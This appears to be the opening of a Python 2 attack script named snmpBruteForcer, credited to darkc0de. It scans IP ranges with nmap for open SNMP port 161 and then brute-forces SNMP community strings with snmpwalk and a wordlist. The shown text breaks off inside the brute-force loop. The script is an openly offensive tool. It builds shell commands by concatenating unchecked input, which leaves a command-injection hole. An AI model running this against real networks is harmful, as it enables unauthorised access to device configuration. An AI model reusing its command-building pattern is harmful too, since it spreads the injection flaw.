#!usr/bin/python
#Uses nmap to check if snmp port is open then uses snmpwalk to try and bruteforce
#the community name.

#Required: nmap and snmpwalk 

#Changelog: added iprange, single scans and threading for random scans
#Changelog: added the ability to add your own wordlist, it will add to 
#the ones given and erase the duplicates

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import time, StringIO, commands, sys, re, threading, sets

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com snmpBruteForcer v1.2"
	print "\t--------------------------------------------------\n"
	
def scan(option):
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 '+option+' -p 161 | grep open -B 3')[1]).read()
	if re.search("command not found",nmap.lower()):
		print "\n[-] nmap not installed!!!\n"
		sys.exit(1)
	else:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", nmap)
		if ipaddr:    		
			return ipaddr

def brute(ip):
	print "\n[+] Attempting BruteForce:",ip
	try:
		for n in names:
			response = StringIO.StringIO(commands.getstatusoutput('snmpwalk '+ip+" "+n)[1]).readlines()